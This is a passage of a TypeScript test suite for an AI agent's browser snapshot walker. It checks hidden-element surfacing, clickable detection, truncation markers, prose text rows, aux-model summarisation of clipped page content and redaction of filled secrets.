      expect(pageCallCount).toBeGreaterThanOrEqual(1);
      // The select itself must be present as a combobox.
      expect(result.text).toContain("combobox");
      // The two enabled options should each show as an `option "<name>"
      // value="<v>"` row.
      const optionLines = result.text.split("\n").filter((line) => line.includes(" option "));
      expect(optionLines.length).toBeGreaterThanOrEqual(2);
      expect(result.text).toContain('option "Small" value="s"');
      expect(result.text).toContain('option "Medium" value="m"');
      // Disabled option is filtered.
      expect(result.text).not.toContain('value="l"');
      // Distinct refs per option (we just check that each option line
      // carries its own [@eN] token and they're not the same).
      const refs = optionLines
        .map((line) => /\[(@e\d+)\]/.exec(line)?.[1])
        .filter((r): r is string => Boolean(r));
      expect(refs.length).toBeGreaterThanOrEqual(2);
      expect(new Set(refs).size).toBe(refs.length);
    } finally {
      if (originalDocument === undefined) {
        delete (globalThis as Record<string, unknown>).document;
      } else {
        (globalThis as Record<string, unknown>).document = originalDocument;
      }
      if (originalWindow === undefined) {
        delete (globalThis as Record<string, unknown>).window;
      } else {
        (globalThis as Record<string, unknown>).window = originalWindow;
      }
      if (originalCSS === undefined) {
        delete (globalThis as Record<string, unknown>).CSS;
      } else {
        (globalThis as Record<string, unknown>).CSS = originalCSS;
      }
    }
  });
});

// Shared fake-DOM scaffolding for the snapshot-walker suites below. Each
// test plants its own document.body, calls __test.snapshotForTest with a
// fake page that runs the evaluate-callback locally, and restores globals
// on exit. The element model is the superset every suite needs:
// per-element computed cursor, parentElement wiring (makeWalkerEl links
// children to their parent), <select>/<option> fields, and a
// document.querySelector that resolves `label[for="..."]` over the
// planted body tree.
type WalkerFakeEl = {
  tagName: string;
  type?: string;
  value?: string;
  disabled?: boolean;
  hidden?: boolean;
  label?: string;
  text?: string;
  _attrs: Record<string, string>;
  _children: WalkerFakeEl[];
  _textContent: string;
  _visible: boolean;
  _cursor: string;
  // Planted by iframe tests onto IFRAME fakes: a fake frame document
  // ({ body, location, querySelectorAll }) for same-origin frames, or a
  // throwing getter (via Object.defineProperty) for cross-origin ones.
  contentDocument?: unknown;
  parentElement: WalkerFakeEl | null;
  // Direct child text nodes the prose-text walker reads (Node.TEXT_NODE
  // === 3). Synthesized from the `directText` init field; element
  // children live under `children`, not here, so the walker's direct-text
  // read never picks them up. Absent unless a test opts in, so existing
  // walker tests stay byte-identical.
  childNodes?: Array<{ nodeType: number; textContent: string }>;
  getAttribute(name: string): string | null;
  setAttribute(name: string, value: string): void;
  removeAttribute(name: string): void;
  getBoundingClientRect(): { width: number; height: number };
  get children(): WalkerFakeEl[];
  get textContent(): string;
  querySelectorAll(selector: string): WalkerFakeEl[];
};
const makeWalkerEl = (init: {
  tagName: string;
  type?: string;
  value?: string;
  disabled?: boolean;
  hidden?: boolean;
  label?: string;
  text?: string;
  visible?: boolean;
  cursor?: string;
  children?: WalkerFakeEl[];
  textContent?: string;
  directText?: string;
  attrs?: Record<string, string>;
}): WalkerFakeEl => {
  const visible = init.visible ?? true;
  const children = init.children ?? [];
  const el: WalkerFakeEl = {
    tagName: init.tagName,
    type: init.type,
    value: init.value,
    disabled: init.disabled,
    hidden: init.hidden,
    label: init.label,
    text: init.text,
    _attrs: { ...(init.attrs ?? {}) },
    _children: children,
    _textContent: init.textContent ?? "",
    _visible: visible,
    _cursor: init.cursor ?? "auto",
    parentElement: null,
    ...(init.directText !== undefined
      ? { childNodes: [{ nodeType: 3, textContent: init.directText }] }
      : {}),
    getAttribute(name: string) {
      return Object.prototype.hasOwnProperty.call(this._attrs, name) ? this._attrs[name]! : null;
    },
    setAttribute(name: string, value: string) {
      this._attrs[name] = value;
    },
    removeAttribute(name: string) {
      delete this._attrs[name];
    },
    getBoundingClientRect() {
      return this._visible ? { width: 100, height: 20 } : { width: 0, height: 0 };
    },
    get children() {
      return this._children;
    },
    get textContent() {
      return this._textContent;
    },
    querySelectorAll(selector: string) {
      const matches: WalkerFakeEl[] = [];
      const recurse = (node: WalkerFakeEl) => {
        if (selector === "option") {
          if (node.tagName === "OPTION") matches.push(node);
        } else if (selector === "iframe") {
          if (node.tagName === "IFRAME") matches.push(node);
        } else if (selector.startsWith("[") && selector.endsWith("]")) {
          const attr = selector.slice(1, -1);
          if (Object.prototype.hasOwnProperty.call(node._attrs, attr)) matches.push(node);
        }
        for (const child of node._children) recurse(child);
      };
      for (const child of this._children) recurse(child);
      return matches;
    }
  };
  for (const child of children) child.parentElement = el;
  return el;
};
// Installs the fake DOM globals the walker reads from inside the
// page.evaluate callback (which runs locally under the fake page). The
// returned `restore` function puts the originals back.
const installWalkerDom = (body: WalkerFakeEl): (() => void) => {
  const originalDocument = (globalThis as Record<string, unknown>).document;
  const originalWindow = (globalThis as Record<string, unknown>).window;
  const originalCSS = (globalThis as Record<string, unknown>).CSS;
  const findByLabelFor = (target: string): WalkerFakeEl | null => {
    let found: WalkerFakeEl | null = null;
    const recurse = (node: WalkerFakeEl) => {
      if (found) return;
      if (node.tagName === "LABEL" && node.getAttribute("for") === target) {
        found = node;
        return;
      }
      for (const child of node._children) recurse(child);
    };
    recurse(body);
    return found;
  };
  (globalThis as unknown as { document: unknown }).document = {
    body,
    querySelectorAll: (selector: string) => body.querySelectorAll(selector),
    querySelector: (sel: string) => {
      const m = /^label\[for="(.+)"\]$/.exec(sel);
      return m ? findByLabelFor(m[1]!) : null;
    },
    getElementById: (_id: string) => null
  };
  (globalThis as unknown as { window: unknown }).window = {
    getComputedStyle: (el: unknown) => ({
      display: "block",
      visibility: "visible",
      cursor: (el as WalkerFakeEl)._cursor ?? "auto"
    })
  };
  (globalThis as unknown as { CSS: unknown }).CSS = { escape: (s: string) => s };
  return () => {
    if (originalDocument === undefined) {
      delete (globalThis as Record<string, unknown>).document;
    } else {
      (globalThis as Record<string, unknown>).document = originalDocument;
    }
    if (originalWindow === undefined) {
      delete (globalThis as Record<string, unknown>).window;
    } else {
      (globalThis as Record<string, unknown>).window = originalWindow;
    }
    if (originalCSS === undefined) {
      delete (globalThis as Record<string, unknown>).CSS;
    } else {
      (globalThis as Record<string, unknown>).CSS = originalCSS;
    }
  };
};

// Tests for hidden-element surfacing in the snapshot walker. The walker
// must emit invisible interactive elements (with a [hidden] marker) so
// wait_for state:"hidden"/"attached"/"detached" can target them, AND must
// always emit <input type="file"> regardless of visibility so hidden file
// inputs behind styled-button uploaders are still drivable via
// browser_upload_file.
describe("snapshot walker — hidden interactive elements", () => {
  type FakeEl = WalkerFakeEl;
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;

  // Fake Page whose page.evaluate(fn, arg) runs fn(arg) locally; the
  // locator factory returns a synthetic locator stub keyed by selector so
  // the post-walk `refs` map can carry distinct values per ref.
  const makeFakePage = (): { page: import("playwright-core").Page; locatorOf: (sel: string) => unknown } => {
    const fakeLocators = new Map<string, unknown>();
    const page = {
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => {
        if (!fakeLocators.has(sel)) fakeLocators.set(sel, { __sel: sel });
        return fakeLocators.get(sel) as unknown;
      }
    } as unknown as import("playwright-core").Page;
    return { page, locatorOf: (sel: string) => fakeLocators.get(sel) };
  };

  test("emits visible button + hidden file input + hidden dialog with [hidden] markers and all three resolve via refs", async () => {
    // <body>
    //   <button>Save</button>
    //   <input type="file" style="display:none">     ← hidden but force-emitted
    //   <div role="dialog" style="display:none">…</div>  ← invisible interactive
    // </body>
    const button = makeEl({ tagName: "BUTTON", textContent: "Save" });
    const fileInput = makeEl({ tagName: "INPUT", type: "file", visible: false });
    const dialog = makeEl({
      tagName: "DIV",
      visible: false,
      attrs: { role: "dialog" },
      textContent: "Modal content"
    });
    const body = makeEl({ tagName: "BODY", children: [button, fileInput, dialog] });
    const restore = installFakeDom(body);
    const { page } = makeFakePage();
    try {
      const result = await browserTest.snapshotForTest(page, false);

      // Visible button: normal ref + name, no [hidden] annotation.
      expect(result.text).toMatch(/\[@e\d+\] button "Save"/);
      expect(result.text).not.toMatch(/\[@e\d+\] button "Save".*\[hidden\]/);

      // File input: role "file" + [hidden] marker, no name/value noise.
      const fileLine = result.text.split("\n").find((line) => line.includes(" file "));
      expect(fileLine).toBeDefined();
      expect(fileLine).toMatch(/\[@e\d+\] file \[hidden\]/);

      // Hidden dialog: role "dialog" + [hidden] marker.
      const dialogLine = result.text.split("\n").find((line) => line.includes(" dialog"));
      expect(dialogLine).toBeDefined();
      expect(dialogLine).toMatch(/\[@e\d+\] dialog \[hidden\]/);

      // All three refs must resolve via the refs map returned by the
      // walker (this is what session.refs gets populated with).
      const allRefs = Array.from(result.text.matchAll(/\[(@e\d+)\]/g)).map((m) => m[1]!);
      expect(allRefs.length).toBeGreaterThanOrEqual(3);
      for (const ref of allRefs) {
        expect(result.refs.has(ref)).toBe(true);
      }
    } finally {
      restore();
    }
  });

  test("caps hidden entries at 50 and appends counted [...hidden truncated] marker", async () => {
    const hiddenChildren: FakeEl[] = [];
    for (let i = 0; i < 100; i++) {
      // Each child is a hidden <button> — interactive but offsetParent-less
      // in real Chromium. The walker should emit at most 50 of them.
      hiddenChildren.push(makeEl({ tagName: "BUTTON", visible: false, textContent: `btn-${i}` }));
    }
    const body = makeEl({ tagName: "BODY", children: hiddenChildren });
    const restore = installFakeDom(body);
    const { page } = makeFakePage();
    try {
      const result = await browserTest.snapshotForTest(page, false);
      const hiddenLines = result.text.split("\n").filter((line) => line.includes("[hidden]"));
      expect(hiddenLines.length).toBeLessThanOrEqual(50);
      // We planted 100, so cap must have engaged. The marker carries the
      // omitted count (100 planted - 50 emitted) so the model can tell how
      // much is left.
      expect(hiddenLines.length).toBe(50);
      expect(result.text).toContain("[...hidden truncated +50 more hidden]");
    } finally {
      restore();
    }
  });
});

// Tests for cursor-interactivity augmentation in the snapshot walker. A
// visible element with no interactive tag and no explicit role still earns
// a ref (role "clickable") when the page signals clickability via computed
// cursor:pointer, an onclick attribute, or tabindex >= 0; inherited cursor
// styles are deduped so only the outermost cursor-qualifying element emits.
// Hidden radio/checkbox inputs with a visible associated <label> are
// force-emitted with [hidden] like file inputs. See ADR
// browser-automation-engine.md.
describe("snapshot walker — cursor-interactive clickables", () => {
  type FakeEl = WalkerFakeEl;
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  const makeFakePage = (): import("playwright-core").Page =>
    ({
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({ __sel: sel } as unknown)
    } as unknown as import("playwright-core").Page);

  test("emits cursor:pointer div as [clickable] once, deduping inherited-cursor descendants", async () => {
    // <body>
    //   <div style="cursor:pointer">Open settings
    //     <span>Open settings</span>      ← inherited cursor, deduped
    //   </div>
    //   <button>Save</button>             ← control: still a plain button
    // </body>
    const span = makeEl({ tagName: "SPAN", cursor: "pointer", textContent: "Open settings" });
    const card = makeEl({ tagName: "DIV", cursor: "pointer", textContent: "Open settings", children: [span] });
    const button = makeEl({ tagName: "BUTTON", textContent: "Save" });
    const body = makeEl({ tagName: "BODY", children: [card, button] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      const clickableLines = result.text.split("\n").filter((line) => line.includes(" clickable "));
      expect(clickableLines.length).toBe(1);
      expect(clickableLines[0]).toMatch(/\[@e\d+\] clickable "Open settings"/);
      // The clickable ref resolves like any other ref.
      const ref = /\[(@e\d+)\]/.exec(clickableLines[0]!)?.[1];
      expect(ref).toBeDefined();
      expect(result.refs.has(ref!)).toBe(true);
      // Native controls are unaffected.
      expect(result.text).toMatch(/\[@e\d+\] button "Save"/);
    } finally {
      restore();
    }
  });

  test("own onclick/tabindex re-qualifies inside a cursor-pointer ancestor; tabindex=-1 and empty names don't", async () => {
    // <div style="cursor:pointer">Cat card
    //   <span onclick="like()">Like</span>       ← own handler, NOT deduped
    //   <span tabindex="0">Share</span>          ← focusable, NOT deduped
    //   <span tabindex="-1">Skip me</span>       ← not focusable, deduped
    // </div>
    // <div style="cursor:pointer"></div>         ← empty name, skipped
    const like = makeEl({ tagName: "SPAN", cursor: "pointer", textContent: "Like", attrs: { onclick: "like()" } });
    const share = makeEl({ tagName: "SPAN", cursor: "pointer", textContent: "Share", attrs: { tabindex: "0" } });
    const skip = makeEl({ tagName: "SPAN", cursor: "pointer", textContent: "Skip me", attrs: { tabindex: "-1" } });
    const card = makeEl({
      tagName: "DIV",
      cursor: "pointer",
      textContent: "Cat card Like Share Skip me",
      children: [like, share, skip]
    });
    const empty = makeEl({ tagName: "DIV", cursor: "pointer", textContent: "" });
    const body = makeEl({ tagName: "BODY", children: [card, empty] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      const clickableLines = result.text.split("\n").filter((line) => line.includes(" clickable "));
      // Card + Like + Share; "Skip me" deduped, empty div skipped.
      expect(clickableLines.length).toBe(3);
      expect(result.text).toContain('clickable "Like"');
      expect(result.text).toContain('clickable "Share"');
      expect(result.text).not.toContain('"Skip me"');
      expect(result.text).not.toContain("[...clickable truncated]");
    } finally {
      restore();
    }
  });

  test("synthesizes a name for nameless self-qualified / icon-only clickables so they earn a ref", async () => {
    // <div onclick="menu()"><svg/></div>          ← self-qualified, icon child
    // <div style="cursor:pointer"><svg aria-label="More options"/></div>
    //                                              ← cursor-qualified, icon carries the label
    // <div style="cursor:pointer">Has a name       ← cursor-qualified WITH a name (existing path)
    //   <span></span>                              ← nameless, no icon, no own handler → still skipped
    // </div>
    const svgBare = makeEl({ tagName: "SVG" });
    const iconMenu = makeEl({ tagName: "DIV", textContent: "", attrs: { onclick: "menu()" }, children: [svgBare] });
    const svgLabeled = makeEl({ tagName: "SVG", attrs: { "aria-label": "More options" } });
    const iconLabeled = makeEl({ tagName: "DIV", cursor: "pointer", textContent: "", children: [svgLabeled] });
    const namelessChild = makeEl({ tagName: "SPAN", cursor: "pointer", textContent: "" });
    const namedWrapper = makeEl({ tagName: "DIV", cursor: "pointer", textContent: "Has a name", children: [namelessChild] });
    const body = makeEl({ tagName: "BODY", children: [iconMenu, iconLabeled, namedWrapper] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      const clickableLines = result.text.split("\n").filter((line) => line.includes(" clickable "));
      // The self-qualified <svg> wrapper falls back to the generic handle…
      expect(result.text).toContain('clickable "icon button"');
      // …and the labeled icon's aria-label is lifted onto the wrapper.
      expect(result.text).toContain('clickable "More options"');
      // Exactly three clickables — the two synthesized icon controls plus
      // the named wrapper. The wrapper's nameless cursor:pointer <span> child
      // neither self-qualifies nor wraps an icon, so it stays skipped (no
      // div-soup regression: a fallback name is NOT minted for it).
      expect(clickableLines.length).toBe(3);
      expect(result.text).toContain('clickable "Has a name"');
      // Both synthesized clickables resolve like any other ref.
      const synthesized = clickableLines.filter((line) => /"(icon button|More options)"/.test(line));
      expect(synthesized.length).toBe(2);
      for (const line of synthesized) {
        const ref = /\[(@e\d+)\]/.exec(line)?.[1];
        expect(ref).toBeDefined();
        expect(result.refs.has(ref!)).toBe(true);
      }
    } finally {
      restore();
    }
  });

  test("hidden radio/checkbox with a visible label is force-emitted past the hidden budget", async () => {
    // Fill the hidden budget (50) with hidden role=dialog divs so the
    // hidden-element fallback path can't be what emits the toggles — only
    // the label-promotion force-emit can.
    const filler: FakeEl[] = [];
    for (let i = 0; i < 50; i++) {
      filler.push(makeEl({ tagName: "DIV", visible: false, attrs: { role: "dialog" } }));
    }
    // <label>Subscribe <input type="radio" hidden></label>   ← wrapping label
    const radio = makeEl({ tagName: "INPUT", type: "radio", visible: false });
    const wrapLabel = makeEl({ tagName: "LABEL", textContent: "Subscribe", children: [radio] });
    // <input type="checkbox" id="tos" hidden> <label for="tos">Agree</label>
    const checkbox = makeEl({ tagName: "INPUT", type: "checkbox", visible: false, attrs: { id: "tos" } });
    const forLabel = makeEl({ tagName: "LABEL", textContent: "Agree", attrs: { for: "tos" } });
    // <input type="checkbox" hidden>   ← no label: stays on the capped path
    const orphan = makeEl({ tagName: "INPUT", type: "checkbox", visible: false });
    const body = makeEl({ tagName: "BODY", children: [...filler, wrapLabel, checkbox, forLabel, orphan] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      // Both labeled toggles got refs despite the exhausted hidden budget.
      expect(result.text).toMatch(/\[@e\d+\] radio \[hidden\]/);
      expect(result.text).toMatch(/\[@e\d+\] checkbox \[hidden\]/);
      // The orphan checkbox was over the hidden budget — exactly one
      // checkbox line means the labeled one is the one that surfaced.
      const checkboxLines = result.text.split("\n").filter((line) => line.includes(" checkbox "));
      expect(checkboxLines.length).toBe(1);
    } finally {
      restore();
    }
  });

  test("caps clickable emissions at 75 and appends counted [...clickable truncated] marker", async () => {
    const children: FakeEl[] = [];
    for (let i = 0; i < 80; i++) {
      // onclick (not cursor) so ancestor dedupe can't interfere with the count.
      children.push(makeEl({ tagName: "DIV", textContent: `row-${i}`, attrs: { onclick: "go()" } }));
    }
    const body = makeEl({ tagName: "BODY", children });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      const clickableLines = result.text.split("\n").filter((line) => line.includes(" clickable "));
      expect(clickableLines.length).toBe(75);
      // Marker carries the omitted count (80 planted - 75 emitted).
      expect(result.text).toContain("[...clickable truncated +5 more clickables]");
    } finally {
      restore();
    }
  });
});

// Char-budget truncation: when the assembled snapshot lines exceed
// SNAPSHOT_CHAR_BUDGET, the [...truncated] marker carries the count of
// entries that never made it into the text, so the model can weigh
// scrolling on against stopping.
// Prose-text emission (FULL mode only). The accessibility walk drops
// plain text containers (comment bodies, article paragraphs) because they
// carry no interactive role; the full-mode prose branch emits ONE "text"
// row per leaf prose container, reading its DIRECT text nodes (not the
// recursive textContent that would re-emit nested controls' names). Diff
// (full=false) walks never run the branch, so post-action snapshots stay
// noise-free.
describe("snapshot walker — prose text rows", () => {
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  const makeFakePage = (): import("playwright-core").Page =>
    ({
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({ __sel: sel } as unknown)
    } as unknown as import("playwright-core").Page);

  afterEach(() => {
    browserTest.resetFilledSecretsForTest();
  });

  test("full mode emits a text row for a prose container; inline link still emits its own row, no duplication", async () => {
    // <div class="commtext">  ← prose container, no role
    //   "This is a great point about "  ← direct text node
    //   <a href="...">the article</a>   ← inline child, own link row
    //   " and I agree."                  ← direct text node
    // </div>
    const link = makeEl({ tagName: "A", textContent: "the article", attrs: { href: "https://example.com/a" } });
    const commtext = makeEl({
      tagName: "DIV",
      directText: "This is a great point about and I agree.",
      children: [link]
    });
    const body = makeEl({ tagName: "BODY", children: [commtext] });
    const restore = installFakeDom(body);
    try {
      const full = await browserTest.snapshotForTest(makeFakePage(), true);
      // The prose container's direct text is surfaced as a text row.
      expect(full.text).toContain('text "This is a great point about and I agree."');
      // The inline <a> still emits its own link row.
      expect(full.text).toContain("link");
      expect(full.text).toContain("the article");
      // The link's name appears once (its own row), never folded into the
      // prose row — reading direct text nodes only avoids the duplication.
      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
      expect(proseRow).not.toContain("the article");
    } finally {
      restore();
    }
  });

  test("diff mode (full=false) emits NO text row", async () => {
    const commtext = makeEl({
      tagName: "DIV",
      directText: "Some prose that full mode would surface."
    });
    const body = makeEl({ tagName: "BODY", children: [commtext] });
    const restore = installFakeDom(body);
    try {
      const diff = await browserTest.snapshotForTest(makeFakePage(), false);
      expect(diff.text).not.toContain("text \"");
      expect(diff.text).not.toContain("Some prose");
    } finally {
      restore();
    }
  });

  test("a prose container with a non-inline child element does not emit a text row", async () => {
    // A <div> wrapping a <div> is a structural container, not a leaf prose
    // block — its text belongs to the descendants, walked separately.
    const inner = makeEl({ tagName: "DIV", directText: "Inner prose." });
    const outer = makeEl({
      tagName: "DIV",
      directText: "Outer wrapper text.",
      children: [inner]
    });
    const body = makeEl({ tagName: "BODY", children: [outer] });
    const restore = installFakeDom(body);
    try {
      const full = await browserTest.snapshotForTest(makeFakePage(), true);
      // The leaf inner div emits a text row; the structural outer does not.
      expect(full.text).toContain('text "Inner prose."');
      expect(full.text).not.toContain("Outer wrapper text.");
    } finally {
      restore();
    }
  });

  test("a text row longer than the per-row cap is sliced", async () => {
    const long = "z".repeat(900);
    const commtext = makeEl({ tagName: "P", directText: long });
    const body = makeEl({ tagName: "BODY", children: [commtext] });
    const restore = installFakeDom(body);
    try {
      const full = await browserTest.snapshotForTest(makeFakePage(), true);
      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
      const m = /text "(z+)"/.exec(proseRow);
      expect(m).not.toBeNull();
      // SNAPSHOT_TEXT_ROW_MAX_CHARS = 400.
      expect(m![1]!.length).toBe(400);
    } finally {
      restore();
    }
  });

  test("a registered secret embedded in prose is redacted in the emitted text row", async () => {
    const secret = "hunter2-super-secret-value";
    browserTest.recordFilledSecretForTest("t-prose-secret", secret);
    const commtext = makeEl({
      tagName: "P",
      directText: `My password is ${secret} please keep it safe.`
    });
    const body = makeEl({ tagName: "BODY", children: [commtext] });
    const restore = installFakeDom(body);
    try {
      const full = await browserTest.snapshotForTest(makeFakePage(), true, "t-prose-secret");
      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
      expect(proseRow).toContain("[redacted]");
      expect(full.text).not.toContain(secret);
    } finally {
      restore();
    }
  });

  test("prose-heavy full-mode page rides the existing char-budget truncation path", async () => {
    // 400 prose blocks of ~900 chars each → far past the 32k char budget;
    // the prose rows must clip via the existing counted marker, not blow
    // the budget. Asserts the assembled text stays bounded.
    const children: WalkerFakeEl[] = [];
    for (let i = 0; i < 400; i++) {
      children.push(makeEl({ tagName: "P", directText: `block-${i}-${"y".repeat(880)}` }));
    }
    const body = makeEl({ tagName: "BODY", children });
    const restore = installFakeDom(body);
    try {
      const full = await browserTest.snapshotForTest(makeFakePage(), true);
      expect(full.truncated).toBe(true);
      expect(full.text).toMatch(/\[\.\.\.truncated \+\d+ more entries\]/);
      // The kept body (everything before the marker) stays within budget.
      const kept = full.text.split("\n[...truncated")[0]!;
      expect(kept.length).toBeLessThanOrEqual(32_000);
    } finally {
      restore();
    }
  });
});

describe("snapshot walker — char-budget truncation count", () => {
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  const makeFakePage = (): import("playwright-core").Page =>
    ({
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({ __sel: sel } as unknown)
    } as unknown as import("playwright-core").Page);

  test("[...truncated] marker reports the omitted-entry count", async () => {
    // 400 visible buttons with ~100-char names → ~110 chars per line,
    // well past the 32k char budget, so the walker clips mid-list.
    const children: WalkerFakeEl[] = [];
    for (let i = 0; i < 400; i++) {
      children.push(makeEl({ tagName: "BUTTON", textContent: `button-${i}-${"x".repeat(90)}` }));
    }
    const body = makeEl({ tagName: "BODY", children });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      expect(result.truncated).toBe(true);
      const match = /\[\.\.\.truncated \+(\d+) more entries\]/.exec(result.text);
      expect(match).not.toBeNull();
      // Emitted lines + reported omitted count must account for every
      // planted entry.
      const emitted = result.text.split("\n").filter((line) => line.includes(" button ")).length;
      expect(emitted).toBeGreaterThan(0);
      expect(emitted + Number(match![1])).toBe(400);
    } finally {
      restore();
    }
  });
});

// Over-budget FIRST-VISIT snapshots (browser_navigate / explicit
// browser_snapshot) summarize the clipped remainder via a bounded aux
// model call instead of silently losing it; plain counted truncation
// remains the fallback when no config reaches the tool or the aux call
// fails. The aux INPUT must be redacted with the same pass as the
// snapshot text, and post-action diff snapshots never summarize.
describe("snapshot remainder summarization", () => {
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  const makeFakePage = (state: { url: string; onClick?: () => void }): import("playwright-core").Page =>
    ({
      url: () => state.url,
      title: async () => "Big page",
      waitForLoadState: async () => undefined,
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({
        __sel: sel,
        click: async (_opts?: { timeout?: number }) => {
          state.onClick?.();
        }
      })
    } as unknown as import("playwright-core").Page);
  const echoConfig: RuntimeConfig = {
    instance: "test",
    port: 7337,
    token: "test",
    provider: { name: "echo", model: "gini-echo-v0" },
    workspaceRoot: "/tmp",
    stateRoot: "/tmp/gini-aux-test",
    logRoot: "/tmp/gini-aux-test-logs"
  };
  // ~110 chars per button line → `count` of them blows the 32k char
  // budget well before the list ends.
  const makeBigBody = (count: number, lastText?: string): WalkerFakeEl => {
    const children: WalkerFakeEl[] = [];
    for (let i = 0; i < count; i++) {
      children.push(makeEl({ tagName: "BUTTON", textContent: `button-${i}-${"x".repeat(90)}` }));
    }
    if (lastText !== undefined) {
      children.push(makeEl({ tagName: "BUTTON", textContent: lastText }));
    }
    return makeEl({ tagName: "BODY", children });
  };

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    clearEchoAuxTextResponses();
  });

  test("over-budget first visit appends kept-head + divider + aux summary; remainder fed to the aux model", async () => {
    const restore = installFakeDom(makeBigBody(400));
    browserTest.installFakeSessionWithPageForTest("aux-sum", makeFakePage({ url: "https://example.com/big" }));
    setEchoAuxTextResponse({ text: "Remaining rows are more list buttons [@e350] through [@e400]." });
    try {
      const raw = await browserSnapshot("aux-sum", {}, echoConfig);
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; truncated: boolean };
      expect(parsed.success).toBe(true);
      expect(parsed.truncated).toBe(true);
      // Kept head + counted marker survive unchanged.
      expect(parsed.snapshot).toContain('[@e1] button "button-0-');
      expect(parsed.snapshot).toContain("[...truncated +");
      // Divider + summary (with its verbatim refs) are appended.
      expect(parsed.snapshot).toContain("remainder summarized by aux model");
      expect(parsed.snapshot).toContain("[@e350]");
      // The aux model received the clipped remainder, not the head.
      const requests = getEchoAuxTextRequests();
      expect(requests.length).toBe(1);
      expect(requests[0]!.user).toContain("button-399");
      expect(requests[0]!.user).not.toContain("button-0-");
    } finally {
      restore();
    }
  });

  test("aux failure falls back to plain counted truncation; no config never calls the aux model", async () => {
    const restore = installFakeDom(makeBigBody(400));
    try {
      browserTest.installFakeSessionWithPageForTest("aux-fail", makeFakePage({ url: "https://example.com/big" }));
      setEchoAuxTextFailure("aux model unavailable");
      const failed = JSON.parse(await browserSnapshot("aux-fail", {}, echoConfig)) as { success: boolean; snapshot: string };
      expect(failed.success).toBe(true);
      expect(failed.snapshot).toContain("[...truncated +");
      expect(failed.snapshot).not.toContain("remainder summarized");
      expect(getEchoAuxTextRequests().length).toBe(1);

      clearEchoAuxTextResponses();
      browserTest.clearFakeSessionsForTest();
      browserTest.installFakeSessionWithPageForTest("aux-none", makeFakePage({ url: "https://example.com/big" }));
      const noConfig = JSON.parse(await browserSnapshot("aux-none", {})) as { success: boolean; snapshot: string };
      expect(noConfig.success).toBe(true);
      expect(noConfig.snapshot).toContain("[...truncated +");
      expect(noConfig.snapshot).not.toContain("remainder summarized");
      expect(getEchoAuxTextRequests().length).toBe(0);
    } finally {
      restore();
    }
  });

  test("the aux model input is redacted: a registered secret in the remainder never reaches the provider", async () => {
    const secret = "hunter2-super-secret-value";
    const restore = installFakeDom(makeBigBody(400, `welcome back ${secret}`));
    browserTest.installFakeSessionWithPageForTest("aux-redact", makeFakePage({ url: "https://example.com/big" }));
    browserTest.recordFilledSecretForTest("aux-redact", secret);
    setEchoAuxTextResponse({ text: "summary of remainder" });
    try {
      const raw = await browserSnapshot("aux-redact", {}, echoConfig);
      expect(raw).not.toContain(secret);
      const requests = getEchoAuxTextRequests();
      expect(requests.length).toBe(1);
      expect(requests[0]!.user).not.toContain(secret);
      expect(requests[0]!.user).toContain("[redacted]");
    } finally {
      restore();
    }
  });

  test("elementCount counts what the result carries: rendered rows only, plus the remainder when summarized", async () => {
    const restore = installFakeDom(makeBigBody(400));
    try {
      // With a summary appended, every ref'd row is reachable from the
      // result (rendered head + summarized remainder, whose refs stay
      // registered and actionable).
      browserTest.installFakeSessionWithPageForTest("aux-count", makeFakePage({ url: "https://example.com/big" }));
      setEchoAuxTextResponse({ text: "summary of the rest" });
      const summarized = JSON.parse(await browserSnapshot("aux-count", {}, echoConfig)) as {
        snapshot: string;
        elementCount: number;
      };
      expect(summarized.snapshot).toContain("remainder summarized");
      expect(summarized.elementCount).toBe(400);

      // Plain counted truncation (no config): elementCount must agree with
      // the rendered rows and the truncation marker, not silently include
      // clipped entries the model cannot see.
      clearEchoAuxTextResponses();
      browserTest.clearFakeSessionsForTest();
      browserTest.installFakeSessionWithPageForTest("aux-count-plain", makeFakePage({ url: "https://example.com/big" }));
      const plain = JSON.parse(await browserSnapshot("aux-count-plain", {})) as {
        snapshot: string;
        elementCount: number;
      };
      expect(plain.snapshot).not.toContain("remainder summarized");
      const emitted = plain.snapshot.split("\n").filter((line) => line.includes(" button ")).length;
      expect(plain.elementCount).toBe(emitted);
      const marker = /\[\.\.\.truncated \+(\d+) more entries\]/.exec(plain.snapshot);
      expect(emitted + Number(marker![1])).toBe(400);
    } finally {
      restore();
    }
  });

  test("post-action diff snapshots never trigger summarization", async () => {
    const body = makeBigBody(400);
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/big" };
    state.onClick = () => {
      const added = makeEl({ tagName: "BUTTON", textContent: "NewButton" });
      added.parentElement = body;
